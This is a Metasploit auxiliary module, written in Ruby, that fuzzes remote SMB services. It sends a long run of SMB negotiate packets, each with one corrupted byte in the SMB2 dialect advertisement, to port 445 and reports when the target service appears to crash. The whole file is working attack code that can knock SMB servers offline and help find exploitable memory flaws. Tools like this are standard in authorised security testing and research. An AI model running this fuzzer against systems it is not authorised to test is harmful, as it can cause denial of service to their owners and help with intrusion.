##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Fuzzer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SMB Negotiate SMB2 Dialect Corruption',
      'Description'    => %q{
        This module sends a series of SMB negotiate requests that advertise a
      SMB2 dialect with corrupted bytes.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE
    ))
    register_options([
      Opt::RPORT(445),
      OptInt.new('MAXDEPTH', [false, 'Specify a maximum byte depth to test'])
    ])
  end

  def do_smb_negotiate(pkt,opts={})
    @connected = false
    connect
    @connected = true
    sock.put(pkt)
    sock.get_once(-1, opts[:timeout])
  end

  def run
    last_str = nil
    last_inp = nil
    last_err = nil

    pkt = make_smb_negotiate
    cnt = 0

    max = datastore['MAXDEPTH'].to_i
    max = nil if max == 0
    tot = ( max ? [max,pkt.length].min : pkt.length) * 256

    print_status("Fuzzing SMB negotiate packet with #{tot} requests")
    fuzz_string_corrupt_byte_reverse(pkt,max) do |str|
      cnt += 1

      if(cnt % 100 == 0)
        print_status("Fuzzing with iteration #{cnt}/#{tot} using #{@last_fuzzer_input}")
      end

      begin
        r = do_smb_negotiate(str, 0.25)
      rescue ::Interrupt
        print_status("Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}")
        raise $!
      rescue ::Exception => e
        last_err = e
      ensure
        disconnect
      end

      if(not @connected)
        if(last_str)
          print_status("The service may have crashed: iteration:#{cnt-1} method=#{last_inp} string=#{last_str.unpack("H*")[0]} error=#{last_err}")
        else
          print_status("Could not connect to the service: #{last_err}")
        end
        return
      end

      last_str = str
      last_inp = @last_fuzzer_input
    end
  end

  def make_smb_negotiate
    # The SMB 2 dialect must be there
    dialects = ['PC NETWORK PROGRAM 1.0', 'LANMAN1.0', 'Windows for Workgroups 3.1a', 'LM1.2X002', 'LANMAN2.1', 'NT LM 0.12', 'SMB 2.002']
    data     = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')

    pkt = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
    pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
    pkt['Payload']['SMB'].v['Flags1'] = 0x18
    pkt['Payload']['SMB'].v['Flags2'] = 0xc853
    pkt['Payload'].v['Payload']       = data
    pkt.to_s
  end
end
